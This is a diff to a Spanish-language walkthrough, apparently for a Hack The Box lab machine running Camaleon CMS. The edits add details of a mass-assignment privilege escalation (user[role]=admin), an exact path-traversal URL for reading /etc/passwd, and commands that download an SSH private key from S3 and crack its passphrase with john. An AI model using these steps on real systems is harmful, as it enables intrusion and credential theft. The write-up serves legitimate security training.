@@ -58,7 +58,7 @@ searchsploit camaleon
 - CVE-2023-30145 — SSTI en `formats`, parcheado en 2.9.0.
 - CVE-2024-46987 — path traversal autenticado / lectura de ficheros.
 - CVE-2024-46986 — escritura arbitraria, bloqueada en 2.9.0.
-- CVE-2025-2304 — escalada de cliente a admin y extracción de credenciales S3.
+- CVE-2025-2304 — **mass assignment** en el endpoint de actualización de usuario: añadir `user[role]=admin` a la petición de cambio de contraseña asciende la cuenta y expone las credenciales S3 del panel.
 
 ## Foothold
 
@@ -84,6 +84,7 @@ LFI para leer el sistema:
 
 ```bash
 python3 CVE-2024-46987.py -u http://facts.htb -l aaa -p bbb /etc/passwd
+# el endpoint real es /admin/media/download_private_file?file=../../../../../../etc/passwd
 ```
 
 ```text
@@ -91,7 +92,7 @@ trivia:x:1000:1000:...
 william:x:1001:1001:...
 ```
 
-La clave del backup pertenece a `trivia` (se confirma con `ssh-keygen -y` y `authorized_keys`) y la flag de usuario está en su home. El LFI sirve para leer el sistema y los ficheros, no para la flag.
+La clave del backup pertenece a `trivia` (lo confirman el comentario `trivia@facts.htb` y `ssh-keygen -y`). El LFI llega al mismo home, así que también permite leer la flag de usuario sin pasar por MinIO.
 
 ## Movimiento lateral
 
@@ -117,7 +118,7 @@ AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY='<secret>' \
 ```bash
 aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
 ssh2john id_ed25519 > key.hash
-john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
+john key.hash --wordlist=/usr/share/wordlists/rockyou.txt   # passphrase de diccionario
 ```
 
 Para saber a qué usuario pertenece la clave:
